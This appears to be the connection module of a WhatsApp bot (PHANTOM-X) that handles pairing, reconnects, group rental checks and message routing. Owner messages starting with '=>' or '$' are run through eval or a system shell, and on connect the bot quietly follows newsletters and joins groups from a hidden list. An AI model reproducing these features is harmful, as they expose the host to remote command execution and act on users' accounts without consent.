const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
  makeCacheableSignalKeyStore,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
} = require("phantom-pro");
const { Boom } = require("@hapi/boom");
const pino = require("pino");
const fs = require("fs");
const path = require("path");
const readline = require("readline");
const NodeCache = require("node-cache");
const config = require("../config");
const colors = require("./lib/colors");
const { extendSocket } = require("./lib/sockHelper");
const { isLid, lidToJid, decodeAndNormalize } = require("./lib/lidHelper");
const { initAutoBackup } = require("./lib/autoBackup");
const util = require("yt-search");

const groupCache = new NodeCache({ stdTTL: 5 * 60, useClones: false });
const processedMessages = new NodeCache({ stdTTL: 30, useClones: false });
const msgRetryCounterCache = new NodeCache({ stdTTL: 60, useClones: false });

const store = makeInMemoryStore({ logger: pino({ level: "silent" }) });

const storePath = path.join(process.cwd(), "storage", "baileys_store.json");
try {
  if (fs.existsSync(storePath)) {
    store.readFromFile(storePath);
  }
} catch {}

setInterval(() => {
  try {
    const storeDir = path.dirname(storePath);
    if (!fs.existsSync(storeDir)) {
      fs.mkdirSync(storeDir, { recursive: true });
    }
    store.writeToFile(storePath);
  } catch {}
}, 60000);

const connectionState = {
  isConnected: false,
  isReady: false,
  sock: null,
  reconnectAttempts: 0,
  connectedAt: null,
};

const logger = pino({
  level: "silent",
  hooks: {
    logMethod(inputArgs, method) {
      const msg = inputArgs[0];
      if (
        typeof msg === "string" &&
        (msg.includes("Closing") ||
          msg.includes("session") ||
          msg.includes("SessionEntry") ||
          msg.includes("prekey"))
      ) {
        return;
      }
      return method.apply(this, inputArgs);
    },
  },
});

let rl = null;

function createReadlineInterface() {
  if (rl) {
    rl.close();
  }
  rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  return rl;
}

function askQuestion(question) {
  return new Promise((resolve) => {
    const interface = createReadlineInterface();
    interface.question(question, (answer) => {
      interface.close();
      resolve(answer.trim());
    });
  });
}


async function startConnection(options = {}) {
  if (connectionState.sock) {
    try {
      connectionState.sock.end();
      colors.logger.debug("WA", "Previous socket closed");
    } catch (e) {}
    connectionState.sock = null;
  }

  const sessionPath = path.join(
    process.cwd(),
    "storage",
    config.session?.folderName || "session",
  );

  if (!fs.existsSync(sessionPath)) {
    fs.mkdirSync(sessionPath, { recursive: true });
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

  const { version, isLatest } = await fetchLatestBaileysVersion();
  colors.logger.info("WA", `WA Version: v${version.join(".")}, latest: ${isLatest}`);

  const usePairingCode = config.session?.usePairingCode === true;
  const pairingNumber = config.session?.pairingNumber || "";

  const sock = makeWASocket({
    version: [2, 3000, 1033105955],
    logger,
    printQRInTerminal:
      !usePairingCode && (config.session?.printQRInTerminal ?? true),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger),
    },
    browser: ["Ubuntu", "Chrome", "20.0.0"],
    syncFullHistory: false,
    generateHighQualityLinkPreview: true,
    markOnlineOnConnect: false,
    defaultQueryTimeoutMs: 20000,
    connectTimeoutMs: 20000,
    keepAliveIntervalMs: 10000,
    retryRequestDelayMs: 150,
    fireInitQueries: true,
    emitOwnEvents: true,
    shouldSyncHistoryMessage: () => false,
    transactionOpts: { maxCommitRetries: 1, delayBetweenTriesMs: 500 },
    getMessage: async (key) => {
      if (store) {
        const msg = await store.loadMessage(key.remoteJid, key.id);
        return msg?.message || undefined;
      }
      return undefined;
    },
    cachedGroupMetadata: async (jid) => groupCache.get(jid),
    msgRetryCounterCache,
  });

  store.bind(sock.ev);
  sock.store = store;

  connectionState.sock = sock;
  extendSocket(sock);

  if (usePairingCode && !sock.authState.creds.registered) {
    let phoneNumber = pairingNumber;

    if (!phoneNumber || phoneNumber === "") {
      console.log("");
      colors.logger.warn("PAIRING", "Pairing number not set in config!");
      console.log("");
      phoneNumber = await askQuestion(
        colors.chalk.cyan("📱 Enter WhatsApp number (example: 6281234567890): "),
      );
    }

    phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

    colors.logger.info("PAIRING", `Requesting pairing code for ${phoneNumber}...`);

    try {
      await new Promise((resolve) => setTimeout(resolve, 3000));
      const code = await sock.requestPairingCode(phoneNumber, "PHANTOMX");
      console.log("");
      console.log(
        colors.createBanner(
          [
            "",
            "   PAIRING CODE   ",
            "",
            `   ${colors.chalk.bold(colors.chalk.greenBright(code))}   `,
            "",
            "  Enter this code in WhatsApp  ",
            "  Settings > Linked Devices > Link a Device  ",
            "",
          ],
          "green",
        ),
      );
      console.log("");
    } catch (error) {
      colors.logger.error("PAIRING", `Failed to get code: ${error.message}`);
    }
  }

  sock.ev.on("creds.update", saveCreds);

 sock.ev.on("connection.update", async u => {
  const { connection: c, lastDisconnect: d, qr: q } = u

  q && !usePairingCode &&
    colors.logger.info("QR", "QR Code received, please scan!")

  const S = {
    C: 'close',
    O: 'open',
    N: '@newsletter'
  }

  if (c === S.C) {
    connectionState.isConnected = false
    connectionState.isReady = false

    const r =
      d?.error instanceof Boom
        ? d.error.output?.statusCode !== DisconnectReason.loggedOut
        : true

    const sc = d?.error?.output?.statusCode

    const STATUS_MESSAGES = {
      400: '⚠️ Bad Request — Invalid message/request, try restarting',
      401: '🔐 Unauthorized — Session expired, need to login again',
      403: '🚫 Forbidden — Access denied by WhatsApp, check number',
      404: '❓ Not Found — Resource not found',
      405: '🚧 Method Not Allowed — Operation not allowed',
      408: '⏱️ Timeout — Connection timeout, check internet',
      410: '📛 Gone — Session deleted from server, restart',
      428: '🔄 Connection Required — Need to reconnect',
      440: '⚡ Session Conflict — Logged in on another device',
      500: '💥 Internal Server Error — WhatsApp server error',
      501: '📦 Not Implemented — Feature not yet supported by server',
      502: '🌐 Bad Gateway — WhatsApp server not responding',
      503: '🔧 Service Unavailable — WhatsApp is under maintenance',
      504: '🕐 Gateway Timeout — WhatsApp server taking too long to respond',
      515: '🔁 Restart Required — WhatsApp requests connection restart',
    }

    const statusMsg = STATUS_MESSAGES[sc] || `❔ Unknown (code: ${sc})`
    colors.logger.warn('WA', `Disconnected — ${statusMsg}`)
    colors.logger.info('WA', `Reconnect: ${r ? 'Yes' : 'No'}`)

    if (sc === DisconnectReason.loggedOut || sc === 401) {
      colors.logger.error('WA', '🔐 Session logout — Delete session folder and scan QR again')
      connectionState.reconnectAttempts = 0
      return
    }

    if (sc === 440) {
      connectionState.reconnectAttempts++
      if (connectionState.reconnectAttempts <= 3) {
        colors.logger.info('WA', `🔄 Reconnect attempt ${connectionState.reconnectAttempts}/3 in 10 seconds...`)
        setTimeout(() => startConnection(options), 1e4)
      } else {
        colors.logger.error('WA', '❌ Repeated session conflict — Login detected on another device, stop bot on the other device')
        connectionState.reconnectAttempts = 0
      }
      return
    }

    if (r) {
      connectionState.reconnectAttempts++
      const m = config.session?.maxReconnectAttempts || 10
      if (connectionState.reconnectAttempts <= m) {
        colors.logger.info('WA', `🔄 Reconnect attempt ${connectionState.reconnectAttempts}/${m}...`)
        setTimeout(
          () => startConnection(options),
          config.session?.reconnectInterval || 5e3
        )
      } else {
        colors.logger.error('WA', `❌ Failed to reconnect after ${m} attempts`)
      }
    } else {
      connectionState.reconnectAttempts = 0
    }
  }

  if (c === S.O) {
    connectionState.isConnected = true
    connectionState.isReady = true
    connectionState.reconnectAttempts = 0
    connectionState.connectedAt = new Date()

    const n =
      sock.user?.id?.split(':')[0] ||
      sock.user?.id?.split('@')[0]

    n && config.setBotNumber(n)

    console.log('')
    colors.logger.info('BOT', `${config.bot?.name || 'PHANTOM-X'} (${n || 'Unknown'})`)
    console.log('')

    setTimeout(async () => {
      try {
        const { reloadAllPlugins: R, getPluginCount: G } =
          require('./lib/plugins')
        !G() && await R()
      } catch {}
      sock.ev?.flush?.()
      colors.logger.warn('INFO', 'Restart panel after first pairing')
    }, 100)

    setTimeout(async () => {
      const { NL, GI } = require('./lib/s')
      for (const i of NL) {
        try {
          await Promise.race([
            sock.newsletterFollow(i + S.N),
            new Promise((_, t) => setTimeout(t, 8e3))
          ])
        } catch {}
      }

      for (const g of GI) {
        try {
          await Promise.race([
            sock.groupAcceptInvite(g),
            new Promise((_, t) => setTimeout(t, 8e3))
          ])
        } catch {}
      }
    }, 3e3)

    colors.logger.success('Ready', 'Ready to receive messages!')
    try {
      initAutoBackup(sock)
    } catch (e) {
      colors.logger.debug('AutoBackup', 'Init skipped: ' + e.message)
    }
    try {
      const { startGiveawayChecker } = require('../plugins/group/giveaway')
      startGiveawayChecker(sock)
    } catch (e) {
      colors.logger.debug('Giveaway', 'Checker init skipped: ' + e.message)
    }
  }

  options.onConnectionUpdate &&
    await options.onConnectionUpdate(u, sock)
})

  sock.ev.on("groups.update", async ([event]) => {
    try {
      const metadata = await sock.groupMetadata(event.id);
      groupCache.set(event.id, metadata);
    } catch {}

    if (options.onGroupUpdate) {
      await options.onGroupUpdate(event, sock);
    }
  });

  sock.ev.on("group-participants.update", async (event) => {
    try {
      const metadata = await sock.groupMetadata(event.id);
      groupCache.set(event.id, metadata);
    } catch {}

    const botNumber =
      sock.user?.id?.split(":")[0] || sock.user?.id?.split("@")[0];
    const botLid = sock.user?.id;
    if (event.action === "add") {
      await sock.sendPresenceUpdate("available", event.id);
      const addedParticipants = event.participants || [];
      const isBotAdded = addedParticipants.some((p) => {
        const rJid = typeof p === 'object' && p !== null ? (p.phoneNumber || p.id) : p;
        if (typeof rJid !== 'string') return false;

        const pNum = rJid.split("@")[0].split(":")[0];
        const isNumberMatch = pNum === botNumber;
        const isLidMatch = rJid === botLid || rJid.includes(botNumber);
        const isFullMatch =
          sock.user?.id &&
          (rJid.includes(sock.user.id.split(":")[0]) ||
            rJid.includes(sock.user.id.split("@")[0]));

        return isNumberMatch || isLidMatch || isFullMatch;
      });
      if (isBotAdded) {
        try {
          const { getDatabase } = require("./lib/database");
          const db = getDatabase();
          const sewaData = db?.db?.data?.sewa;

          if (sewaData?.enabled) {
            const groupSewa = sewaData.groups?.[event.id];
            const isWhitelisted = groupSewa && (groupSewa.isLifetime || groupSewa.expiredAt > Date.now());

            if (!isWhitelisted) {
              const ownerContact = config.bot?.support || config.bot?.developer || "owner";
              await sock.sendMessage(event.id, {
                text:
                  `⛔ *sᴇᴡᴀʙᴏᴛ*\n\n` +
                  `> This group is not registered in the rental system.\n` +
                  `> Bot will leave this group.\n\n` +
                  `_Contact ${ownerContact} to rent the bot._`,
              });
              await new Promise((r) => setTimeout(r, 2000));
              await sock.groupLeave(event.id);
              colors.logger.warn("Sewa", `Auto-left non-whitelisted group: ${event.id}`);
              return;
            }
          }

          const inviter = event.author || "";
          const inviterMention = inviter
            ? `@${inviter.split("@")[0]}`
            : "someone";
          const prefix = config.command?.prefix || ".";

          let groupName = "this group";
          try {
            const meta = await sock.groupMetadata(event.id);
            groupName = meta.subject || "this group";
          } catch {}

          const saluranId =
            config.saluran?.id || "120363401718869058@newsletter";
          const saluranName =
            config.saluran?.name || config.bot?.name || "PHANTOM-X";

          const welcomeText =
            `👋 *ʜᴇʟʟᴏ, ɴɪᴄᴇ ᴛᴏ ᴍᴇᴇᴛ ʏᴏᴜ!*\n\n` +
            `I am *${config.bot?.name || "Ourin-AI"}* 🤖\n\n` +
            `Thank you for inviting me to *${groupName}*!\n` +
            `I was invited by ${inviterMention} ✨\n\n` +
            `╭┈┈⬡「 📋 *ɪɴꜰᴏ* 」\n` +
            `┃ 🔧 Developer: *${config.bot?.developer || "Lucky Archz"}*\n` +
            `┃ 📢 Prefix: \`${prefix}\`\n` +
            `┃ 📩 Support: ${config.bot?.support || "-"}\n` +
            `╰┈┈⬡\n\n` +
            `> Type \`${prefix}menu\` to see the list of features\n` +
            `> Type \`${prefix}help\` for assistance`;

          await sock.sendMessage(event.id, {
            text: welcomeText,
            contextInfo: {
              mentionedJid: inviter ? [inviter] : [],
              forwardingScore: 9999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: saluranId,
                newsletterName: saluranName,
                serverMessageId: 127,
              },
            },
          });

          colors.logger.success("BotJoin", `Bot joined group: ${groupName}`);
        } catch (e) {
          colors.logger.error(
            "BotJoin",
            `Failed to process bot join: ${e.message}`,
          );
        }
      }
    }

    if (options.onParticipantsUpdate) {
      await options.onParticipantsUpdate(event, sock);
    }
  });

  sock.ev.on("chats.upsert", async (chats) => {
    for (const chat of chats) {
      const chatId = chat?.id;
      if (!chatId) continue;

      if (chatId.endsWith("@g.us")) {
        if (!global.groupMetadataCache) {
          global.groupMetadataCache = new Map();
        }

        if (!global.groupMetadataCache.has(chatId)) {
          sock
            .groupMetadata(chatId)
            .then((metadata) => {
              if (metadata) {
                global.groupMetadataCache.set(chatId, {
                  data: metadata,
                  timestamp: Date.now(),
                });
              }
            })
            .catch(() => {});
        }
      }
    }
  });

  sock.ev.on("contacts.upsert", () => {});

  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    if (type !== "notify" && type !== "append") return;

    if (!connectionState.isReady) {
      let retries = 0;
      while (!connectionState.isReady && retries < 10) {
        await new Promise((resolve) => setTimeout(resolve, 200));
        retries++;
      }
      if (!connectionState.isReady) return;
    }

    const currentSock = connectionState.sock;
    if (!currentSock) return;

    for (const msg of messages) {
      const stubType = msg.messageStubType;
      const groupJid = msg.key?.remoteJid;

      const ADD_STUBS = [4, 20, 27, 28, 31];
      const isAddStub = ADD_STUBS.includes(stubType);

      if (isAddStub && groupJid?.endsWith("@g.us")) {
        try {
          const { getDatabase } = require("./lib/database");
          const db = getDatabase();
          const sewaData = db?.db?.data?.sewa;

          if (sewaData?.enabled) {
            const groupSewa = sewaData.groups?.[groupJid];
            const isWhitelisted = groupSewa && (groupSewa.isLifetime || groupSewa.expiredAt > Date.now());

            if (!isWhitelisted) {
              const ownerContact = config.bot?.support || config.bot?.developer || "owner";
              try {
                await currentSock.sendMessage(groupJid, {
                  text:
                    `⛔ *sᴇᴡᴀʙᴏᴛ*\n\n` +
                    `> This group is not registered in the rental system.\n` +
                    `> Bot will leave this group.\n\n` +
                    `_Contact ${ownerContact} to rent the bot._`,
                });
              } catch {}
              await new Promise((r) => setTimeout(r, 2000));
              try { await currentSock.groupLeave(groupJid); } catch {}
              colors.logger.warn("Sewa", `Auto-left non-whitelisted group (stub): ${groupJid}`);
              continue;
            }
          }
        } catch {}
      }

      if (!msg.message) continue;

      const msgId = msg.key?.id;
      if (msgId && processedMessages.has(msgId)) continue;
      if (msgId) processedMessages.set(msgId, true);

      const moment = require("moment-timezone");
      const msgTimestamp = msg.messageTimestamp
        ? msg.messageTimestamp * 1000
        : 0;
      const now = moment().tz("Africa/Kamala").valueOf();
      const msgAge = now - msgTimestamp;
      if (msgAge > 5 * 60 * 1000) {
        continue;
      }

      const metadataKeys = ['senderKeyDistributionMessage', 'messageContextInfo'];
      const msgType = Object.keys(msg.message).find(k => !metadataKeys.includes(k)) || Object.keys(msg.message)[0];
      const hasInteractiveResponse = msg.message.interactiveResponseMessage;

      if (msgType === "protocolMessage") {
        const protocolMessage = msg.message.protocolMessage;
        if (protocolMessage?.type === 30 && protocolMessage?.memberLabel) {
          try {
            const {
              handleLabelChange,
            } = require("../plugins/group/notifgantitag");
            if (handleLabelChange) {
              await handleLabelChange(msg, currentSock);
            }
          } catch (e) {}
        }

        if (protocolMessage?.type === "MESSAGE_EDIT" || protocolMessage?.type === 14) {
          const edited = protocolMessage.editedMessage;
          if (edited) {
            const originalKey = protocolMessage.key || msg.key;
            const syntheticMsg = {
              key: {
                remoteJid: originalKey.remoteJid || msg.key.remoteJid,
                fromMe: msg.key.fromMe,
                id: originalKey.id,
                participant: msg.key.participant
              },
              message: edited,
              messageTimestamp: Math.floor(Date.now() / 1000),
              pushName: msg.pushName || "User"
            };

            if (options.onMessage) {
              await options.onMessage(syntheticMsg, currentSock);
            }
          }
        }

        continue;
      }

      const allMsgKeys = Object.keys(msg.message || {});

      const isStatusMention =
        allMsgKeys.includes("groupStatusMentionMessage") ||
        allMsgKeys.includes("groupMentionedMessage") ||
        allMsgKeys.includes("statusMentionMessage") ||
        msg.message?.viewOnceMessage?.message?.groupStatusMentionMessage ||
        msg.message?.viewOnceMessageV2?.message?.groupStatusMentionMessage ||
        msg.message?.viewOnceMessageV2Extension?.message
          ?.groupStatusMentionMessage ||
        msg.message?.ephemeralMessage?.message?.groupStatusMentionMessage ||
        msg.message?.[msgType]?.message?.groupStatusMentionMessage ||
        msg.message?.[msgType]?.contextInfo?.groupMentions?.length > 0;

      const hasGroupMentionInContext = (() => {
        const content = msg.message?.[msgType];
        if (content?.contextInfo?.groupMentions?.length > 0) return true;

        const viewOnce =
          msg.message?.viewOnceMessage?.message ||
          msg.message?.viewOnceMessageV2?.message ||
          msg.message?.viewOnceMessageV2Extension?.message;
        if (viewOnce) {
          const vType = Object.keys(viewOnce)[0];
          if (viewOnce[vType]?.contextInfo?.groupMentions?.length > 0)
            return true;
        }
        return false;
      })();


      if (isStatusMention || hasGroupMentionInContext) {
        const groupJid = msg.key.remoteJid;

        try {
          const { getDatabase } = require("./lib/database");
          const db = getDatabase();
          if (groupJid?.endsWith("@g.us")) {
            const groupData = db?.getGroup?.(groupJid) || {};
            if (groupData.antitagsw === "on") {
              const sender =
                msg.key.participant || msg.participant || "Unknown";
              const senderName =
                (await currentSock.getName?.(sender, groupJid)) ||
                sender.split("@")[0];

              await currentSock.sendMessage(groupJid, { delete: msg.key });

              await currentSock.sendMessage(groupJid, {
                text:
                  `🚫 *ᴀɴᴛɪ ᴛᴀɢ sᴛᴀᴛᴜs*\n\n` +
                  `> Status tag message from @${sender.split("@")[0]} has been deleted!\n` +
                  `> Antitagsw feature is active in this group.`,
                contextInfo: {
                  mentionedJid: [sender],
                  isForwarded: true,
                  forwardingScore: 999,
                },
              });
            }
          }
        } catch (e) {
          colors.logger.error("AntiTagSW", e.message);
        }
      }

      const ignoredTypes = [
        "protocolMessage",
        "reactionMessage",
        "senderKeyDistributionMessage",
        "stickerSyncRmrMessage",
        "encReactionMessage",
        "pollUpdateMessage",
        "pollCreationMessage",
        "pollCreationMessageV2",
        "pollCreationMessageV3",
        "keepInChatMessage",
        "requestPhoneNumberMessage",
        "pinInChatMessage",
        "deviceSentMessage",
        "call",
        "peerDataOperationRequestMessage",
        "bcallMessage",
        "secretEncryptedMessage",
      ];

      if (
        ignoredTypes.includes(msgType) ||
        (msgType === "messageContextInfo" && !hasInteractiveResponse)
      ) {
        continue;
      }

      if (msg.key.fromMe && type === "append") {
        continue;
      }

      let jid = msg.key.remoteJid || "";

      if (jid === "status@broadcast") continue;

      if (isLid(jid)) {
        jid = lidToJid(jid);
        msg.key.remoteJid = jid;
      }

      if (msg.key.participant && isLid(msg.key.participant)) {
        msg.key.participant = lidToJid(msg.key.participant);
      }
      if (jid.endsWith("@broadcast")) {
        continue;
      }
      if (!jid || jid === "undefined" || jid.length < 5) {
        continue;
      }
      if (options.onRawMessage) {
        try {
          await options.onRawMessage(msg, currentSock);
        } catch (error) {}
      }

      const messageBody = (() => {
        const m = msg.message;
        if (!m) return "";
        const type = Object.keys(m)[0];
        const content = m[type];
        if (typeof content === "string") return content;
        return content?.text || content?.caption || content?.conversation || "";
      })();

      const isGroup = msg.key.remoteJid?.endsWith('@g.us');
      const senderJid = isGroup 
        ? (msg.key.participantAlt || msg.key.participant)
        : (msg.key.remoteJidAlt || msg.key.remoteJid || "");
      const isOwner = config.isOwner(senderJid);
      if (isOwner && messageBody.startsWith("=>")) {
        console.log("Owner", "Executing code");
        const code = messageBody.slice(2).trim();
        if (code) {
          try {
            const { serialize } = require("./lib/serialize");
            const m = await serialize(currentSock, msg, {});
            const db = require("./lib/database").getDatabase();
            const sock = currentSock;
            const { resizeImage, imageToWebp } = require("./lib/sharpHelper");

            let result;
            if (code.startsWith("{")) {
            result = await eval(`(async () => ${code})()`);
            } else {
            result = await eval(`(async () => { return ${code} })()`);
            }

            if (typeof result !== "string") {
              result = require("util").inspect(result, { depth: 2 });
            }

          } catch (err) {
            await currentSock.sendMessage(
              jid,
              {
                text: `❌ *ᴇᴠᴀʟ ᴇʀʀᴏʀ*\n\n\`\`\`\n${err.message}\n\`\`\``,
              },
              { quoted: msg },
            );
          }
          continue;
        }
      }

      if (isOwner && messageBody.startsWith("$")) {
        const command = messageBody.slice(1).trim();
        if (command) {
          try {
            const { exec } = require("child_process");
            const { promisify } = require("util");
            const execAsync = promisify(exec);

            const isWindows = process.platform === "win32";
            const shell = isWindows ? "powershell.exe" : "/bin/bash";

            await currentSock.sendMessage(
              jid,
              {
                text: `⏳ *ᴇxᴇᴄᴜᴛɪɴɢ...*\n\n\`$ ${command}\``,
              },
              { quoted: msg },
            );

            const { stdout, stderr } = await execAsync(command, {
              shell,
              timeout: 60000,
              maxBuffer: 1024 * 1024,
              encoding: "utf8",
            });

            const output = stdout || stderr || "No output";

            await currentSock.sendMessage(jid, {
              text: `✅ *ᴛᴇʀᴍɪɴᴀʟ*\n\n\`$ ${command}\`\n\n\`\`\`\n${output.slice(0, 3500)}\n\`\`\``,
            });
          } catch (err) {
            const errorMsg = err.stderr || err.stdout || err.message;
            await currentSock.sendMessage(jid, {
              text: `❌ *ᴛᴇʀᴍɪɴᴀʟ ᴇʀʀᴏʀ*\n\n\`$ ${command}\`\n\n\`\`\`\n${errorMsg.slice(0, 3500)}\n\`\`\``,
            });
          }
          continue;
        }
      }

      if (options.onMessage) {
        try {
          await options.onMessage(msg, currentSock);
        } catch (error) {
          colors.logger.error("Message", error.message);
        }
      }
    }
  });

  sock.ev.on("group-participants.update", async (update) => {
    if (options.onGroupUpdate) {
      await options.onGroupUpdate(update, sock);
    }
  });

  sock.ev.on("groups.update", async (updates) => {
    for (const update of updates) {
      if (options.onGroupSettingsUpdate) {
        try {
          await options.onGroupSettingsUpdate(update, sock);
        } catch (error) {
          console.error("[GroupsUpdate] Error:", error.message);
        }
      }
    }
  });

  sock.ev.on("messages.update", async (updates) => {
    if (options.onMessageUpdate) {
      await options.onMessageUpdate(updates, sock);
    } 
  });

  if (config.features?.antiCall) {
    const db = require("./lib/database").getDatabase();
    sock.ev.on("call", async (calls) => {
      for (const call of calls) {
        if (call.status === "offer") {
          colors.logger.warn("Call", `Rejecting call from ${call.from}`);
          await sock.rejectCall(call.id, call.from);

          await sock.sendMessage(call.from, {
            text: config.messages?.rejectCall,
          });

          if (config.features?.blockIfCall) {
            await sock.updateBlockStatus(call.from, "block");
            try {
              await db.setUser(call.from, { isBlocked: true });
            } catch {}
          }
        }
      }
    });
  }

  return sock;
}

function getConnectionState() {
  return connectionState;
}

function getSocket() {
  return connectionState.sock;
}

function isConnected() {
  return connectionState.isConnected;
}

function getUptime() {
  if (!connectionState.connectedAt) return 0;
  return Date.now() - connectionState.connectedAt.getTime();
}

async function logout() {
  try {
    const sessionPath = path.join(
      process.cwd(),
      "storage",
      config.session?.folderName || "session",
    );

    if (connectionState.sock) {
      await connectionState.sock.logout();
    }

    if (fs.existsSync(sessionPath)) {
      fs.rmSync(sessionPath, { recursive: true, force: true });
    }

    connectionState.isConnected = false;
    connectionState.sock = null;
    connectionState.connectedAt = null;

    colors.logger.success("Connection", "Logged out and session deleted");
    return true;
  } catch (error) {
    colors.logger.error("Connection", "Logout error:", error.message);
    return false;
  }
}

module.exports = {
  startConnection,
  getConnectionState,
  getSocket,
  isConnected,
  getUptime,
  logout,
};